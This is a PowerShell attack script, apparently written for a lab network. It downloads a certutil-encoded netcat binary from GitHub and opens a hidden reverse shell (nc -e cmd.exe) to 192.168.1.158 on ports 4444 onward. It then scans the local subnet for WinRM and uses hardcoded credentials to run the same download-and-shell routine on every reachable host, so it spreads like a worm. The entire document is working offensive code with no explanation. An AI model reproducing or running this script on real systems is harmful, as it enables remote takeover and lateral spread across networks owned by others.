Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe

$b = 0
$port = 4444
$tst = "f"
$atk = "192.168.1.158"

while ($b -lt 4 -and $tst -ne "t") {

$an = (Test-NetConnection $atk -Port $port -ErrorAction SilentlyContinue).TcpTestSucceeded


if ($an -eq $true){

Start-Sleep -Seconds 20
& powershell -nop -w hidden $env:TEMP\nc.exe 192.168.1.158 $port -e cmd.exe

$tst = "t"

}

$port++
$b++


}


$u = "morty"
$p = "P@ssw0rd"
$atk = "192.168.1.158"

$secpassword = ConvertTo-SecureString $p -AsPlainText -Force
$mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)


  $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
    $manyips = $subnet.Length

    if($manyips -eq 2){$subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[1]}
   
    
    
    $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)
    

    if ($isdot = $subnetrange.EndsWith('.') -eq $false){$subnetrange = $subnetrange + '.'}
    
    
    $iprange = @(1..254)
    
     
    foreach ($i in $iprange){


$currentip = $subnetrange + $i

$TCPObject = new-Object system.Net.Sockets.TcpClient
$result = $TCPObject.ConnectAsync($currentip, '5985').Wait(50)

if ($result -eq $true){

$islive = Test-WSMan $currentip -Credential $mycredential -Authentication Negotiate -ErrorAction SilentlyContinue

if ($islive -ne $null){


Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock {

Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe

$b = 0
$port = 4444
$tst = "f"
$atk = "192.168.1.158"

while ($b -lt 4 -and $tst -ne "t") {

$an = (Test-NetConnection $atk -Port $port -ErrorAction SilentlyContinue).TcpTestSucceeded


if ($an -eq $true){

Start-Sleep -Seconds 20
& powershell -nop -w hidden $env:TEMP\nc.exe 192.168.1.158 $port -e cmd.exe

$tst = "t"

}

$port++
$b++


}

}

}

}

}


